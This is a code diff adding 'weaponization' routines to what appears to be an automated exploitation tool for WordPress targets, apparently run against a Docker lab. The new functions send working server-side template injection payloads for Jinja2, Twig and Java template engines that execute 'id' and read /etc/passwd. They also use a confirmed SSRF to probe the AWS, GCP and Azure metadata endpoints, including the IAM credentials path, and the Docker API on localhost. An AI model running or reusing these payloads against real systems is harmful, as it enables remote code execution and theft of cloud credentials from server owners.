@@ -29,6 +29,7 @@ def _step(step_fn: Optional[Callable], msg: str) -> None:
 def _infer_vuln_class(res) -> str:
     """Infer the vulnerability class from WpVerifyResult evidence."""
     tecnica = (res.evidence.get("tecnica") or "").lower()
+    vuln_class = (res.evidence.get("vuln_class") or "").lower()
     # SQLi techniques
     if any(x in tecnica for x in ("error-based", "union", "boolean", "time-based", "sqli",
                                    "order-by-context")):
@@ -36,8 +37,17 @@ def _infer_vuln_class(res) -> str:
     # LFI / path traversal
     if any(x in tecnica for x in ("canary", "traversal", "lfi", "path")):
         return "lfi"
+    # SSTI — check before generic RCE so template engines get specialized chain
+    if any(x in tecnica for x in ("ssti", "template-inject", "jinja", "twig", "smarty",
+                                   "pebble", "freemarker")) or any(x in vuln_class for x in
+                                   ("ssti", "template-inject", "server-side-template")):
+        return "ssti"
+    # SSRF
+    if any(x in tecnica for x in ("ssrf", "server-side-request")) or any(x in vuln_class for x in
+                                   ("ssrf", "server-side-request")):
+        return "ssrf"
     # Command injection / RCE
-    if any(x in tecnica for x in ("command", "rce", "exec", "shell", "ssti", "code-injection")):
+    if any(x in tecnica for x in ("command", "rce", "exec", "shell", "code-injection")):
         return "rce"
     # Confirm-string based (generic)
     if tecnica in ("confirm-string", "password-reset", "xss-confirmed"):
@@ -376,6 +386,174 @@ def _weaponize_auth_bypass(boot, res, step_fn) -> dict:
             "error": "auth bypass verified but admin endpoints returned no user data"}
 
 
+def _weaponize_ssti(boot, res, step_fn) -> dict:
+    """Escalate confirmed SSTI: read /etc/passwd and attempt a reverse-shell-ready id+hostname dump."""
+    ev = res.evidence
+    endpoint = ev.get("endpoint") or ev.get("ep", "")
+    param = (ev.get("ssti_param") or ev.get("parametro_ganador") or ev.get("param") or "")
+    method = ev.get("metodo") or ev.get("method") or "GET"
+    ssti_engine = (ev.get("ssti_engine") or "").lower()
+
+    _step(step_fn, f"SSTI post-exploit: file read + id (engine={ssti_engine!r})")
+
+    if not endpoint or not param:
+        return {"technique": "ssti_post_exploit", "data": {}, "impact": "",
+                "error": "missing endpoint or param in evidence"}
+
+    # Payload matrix: engine-specific file-read and id gadgets
+    # Priority: Jinja2 → Twig → generic {{7*7}} confirmed engines
+    payloads_file_read = []
+    payloads_id = []
+
+    if ssti_engine in ("jinja2", "jinja", "") :
+        payloads_file_read = [
+            "{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}",
+            "{{''.__class__.__mro__[2].__subclasses__()"
+            "|selectattr('__init__.__globals__','defined')"
+            "|map(attribute='__init__.__globals__')"
+            "|selectattr('popen','defined')"
+            "|map(attribute='popen')|first('cat /etc/passwd')}}",
+        ]
+        payloads_id = [
+            "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
+            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
+        ]
+    if ssti_engine in ("twig", "smarty", "pebble"):
+        payloads_file_read = [
+            "{{['cat /etc/passwd']|map('system')|join}}",
+            "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('cat /etc/passwd')}}",
+        ]
+        payloads_id = [
+            "{{['id']|map('system')|join}}",
+        ]
+    # Fallback: generic RCE payloads that work across engines
+    payloads_file_read += [
+        "#{@java.lang.Runtime.getRuntime().exec('cat /etc/passwd')}",
+        "${'cat /etc/passwd'.execute().text}",
+    ]
+    payloads_id += [
+        "#{@java.lang.Runtime.getRuntime().exec('id')}",
+    ]
+
+    output_data = {}
+
+    # Try id first (lighter, confirms RCE depth)
+    for pl in payloads_id:
+        p = {param: pl}
+        r = _send(boot, method, endpoint,
+                  params=p if method.upper() == "GET" else None,
+                  data=p if method.upper() != "GET" else None)
+        if r is None:
+            continue
+        body = r.text or ""
+        uid_m = re.search(r'uid=\d+\([^)]+\)', body)
+        if uid_m:
+            output_data["id_output"] = uid_m.group(0)
+            _step(step_fn, f"SSTI id RCE confirmed: {uid_m.group(0)}")
+            break
+
+    # Try /etc/passwd read
+    for pl in payloads_file_read:
+        p = {param: pl}
+        r = _send(boot, method, endpoint,
+                  params=p if method.upper() == "GET" else None,
+                  data=p if method.upper() != "GET" else None)
+        if r is None:
+            continue
+        body = r.text or ""
+        # /etc/passwd contains root: entries
+        if re.search(r'root:[x*]:0:0:', body):
+            # Extract first 3 lines
+            lines = [ln for ln in body.splitlines() if ':' in ln and ln.strip()][:3]
+            output_data["etc_passwd_lines"] = lines
+            _step(step_fn, f"SSTI /etc/passwd read confirmed ({len(lines)} lines)")
+            break
+
+    if output_data:
+        impact_parts = []
+        if output_data.get("id_output"):
+            impact_parts.append(f"RCE confirmed: {output_data['id_output']}")
+        if output_data.get("etc_passwd_lines"):
+            impact_parts.append(f"/etc/passwd readable ({len(output_data['etc_passwd_lines'])} entries)")
+        return {
+            "technique": "ssti_post_exploit",
+            "data": output_data,
+            "impact": "; ".join(impact_parts),
+        }
+    return {
+        "technique": "ssti_post_exploit",
+        "data": {},
+        "impact": "",
+        "error": "SSTI file-read payloads sent but no /etc/passwd or id output found",
+    }
+
+
+def _weaponize_ssrf(boot, res, step_fn) -> dict:
+    """Probe internal network via confirmed SSRF: cloud metadata, localhost services."""
+    ev = res.evidence
+    endpoint = ev.get("endpoint") or ev.get("ep", "")
+    param = (ev.get("url_param") or ev.get("parametro_ganador") or ev.get("param") or "")
+    method = ev.get("metodo") or ev.get("method") or "GET"
+
+    _step(step_fn, f"SSRF post-exploit: probing metadata endpoints (param={param!r})")
+
+    if not endpoint or not param:
+        return {"technique": "ssrf_probe", "data": {}, "impact": "",
+                "error": "missing endpoint or param in evidence"}
+
+    # Ordered by impact: AWS IMDSv1 → GCP → Azure → localhost → docker socket
+    probe_targets = [
+        ("aws_imds_v1", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
+        ("aws_imds_token", "http://169.254.169.254/latest/meta-data/instance-id"),
+        ("gcp_metadata", "http://metadata.google.internal/computeMetadata/v1/?recursive=true"),
+        ("azure_imds", "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
+        ("localhost_80", "http://localhost/"),
+        ("localhost_8080", "http://localhost:8080/"),
+        ("docker_socket_via_tcp", "http://localhost:2375/version"),
+    ]
+
+    found = {}
+    for label, target_url in probe_targets:
+        p = {param: target_url}
+        r = _send(boot, method, endpoint,
+                  params=p if method.upper() == "GET" else None,
+                  data=p if method.upper() != "GET" else None)
+        if r is None:
+            continue
+        body = (r.text or "")[:500]
+        if r.status_code in (200, 206):
+            # Cloud metadata markers
+            if any(x in body for x in ("ami-id", "instance-id", "iam", "AccessKeyId",
+                                        "computeMetadata", "subscriptionId", "instanceType")):
+                found[label] = {"url": target_url, "status": r.status_code,
+                                 "snippet": body[:200]}
+                _step(step_fn, f"SSRF cloud metadata confirmed: {label} → {body[:80]!r}")
+            # Localhost services
+            elif "localhost" in target_url and len(body) > 20:
+                found[label] = {"url": target_url, "status": r.status_code,
+                                 "snippet": body[:200]}
+                _step(step_fn, f"SSRF internal service reachable: {label}")
+
+    if found:
+        impact_parts = []
+        for label, _info in found.items():
+            if "aws" in label or "gcp" in label or "azure" in label:
+                impact_parts.append(f"cloud metadata accessible ({label})")
+            else:
+                impact_parts.append(f"internal service reachable ({label})")
+        return {
+            "technique": "ssrf_probe",
+            "data": {"probed": found},
+            "impact": "; ".join(impact_parts),
+        }
+    return {
+        "technique": "ssrf_probe",
+        "data": {},
+        "impact": "",
+        "error": "SSRF probes sent but no metadata or internal service responses found",
+    }
+
+
 def run_weaponization(boot, res, step: Optional[Callable] = None) -> dict:
     """
     Extend confirmed trigger to full impact using the live Docker lab session.
@@ -401,6 +579,10 @@ def run_weaponization(boot, res, step: Optional[Callable] = None) -> dict:
             return _weaponize_sqli(boot, res, step)
         elif vuln_class in ("lfi", "path_traversal", "arbitrary_file_read"):
             return _weaponize_lfi(boot, res, step)
+        elif vuln_class == "ssti":
+            return _weaponize_ssti(boot, res, step)
+        elif vuln_class == "ssrf":
+            return _weaponize_ssrf(boot, res, step)
         elif vuln_class in ("rce", "command_injection"):
             return _weaponize_rce(boot, res, step)
         elif vuln_class == "arbitrary_file_upload":
